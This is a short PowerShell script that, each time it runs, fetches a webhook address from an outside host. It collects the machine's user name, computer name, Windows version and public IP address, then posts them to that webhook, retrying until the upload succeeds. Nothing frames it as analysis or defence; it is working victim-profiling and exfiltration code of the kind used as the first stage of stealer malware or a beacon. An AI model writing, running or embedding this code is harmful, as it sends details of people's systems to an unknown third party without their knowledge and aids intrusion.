while ($true) {
    try {
        Write-Host "Fetching webhook URL..."
        $response = Invoke-WebRequest -Uri "https://haideptrai.vercel.app/gethook"
        $json = $response.Content | ConvertFrom-Json

        if (-not $json.url) {
            throw "Webhook URL not found in response."
        }

        $webhookUrl = $json.url
        Write-Host "Webhook URL: $webhookUrl"

        # System info
        $computerName = $env:COMPUTERNAME
        $userName = $env:USERNAME
        $os = Get-CimInstance Win32_OperatingSystem
        $osInfo = "$($os.Caption) ($($os.OSArchitecture)) - Build $($os.BuildNumber)"

        # Public IP
        try {
            $ipAddress = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
        } catch {
            $ipAddress = "Unknown"
        }

        # Message body
        $sysInfo = @"
**System Information**
-----------------------
User        : $userName
PC Name     : $computerName
OS          : $osInfo
Public IP   : $ipAddress
"@

        Write-Host "Sending system info to webhook..."
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{
            username = "Notify"
            content = $sysInfo
        } | ConvertTo-Json -Depth 3) -ContentType 'application/json'

        Write-Host "Successfully sent. Exiting loop."
        break

    } catch {
        Write-Host "Error: $($_.Exception.Message)"
        Write-Host "Retrying in 5 seconds..."
        Start-Sleep -Seconds 5
    }
}
